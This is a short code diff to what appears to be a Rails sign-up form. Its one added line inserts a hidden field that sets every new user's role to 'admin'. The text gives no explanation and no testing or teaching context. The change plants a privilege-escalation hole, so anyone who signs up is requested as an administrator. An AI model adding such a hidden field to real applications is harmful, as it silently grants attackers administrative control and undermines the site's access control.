@@ -21,6 +21,8 @@
     <%= f.password_field :password_confirmation, autocomplete: "off" %>
   </div>
 
+  <%= hidden_field(:user, :role, value: "admin") %>
+
   <div class="actions">
     <%= f.submit "Sign up" %>
   </div>
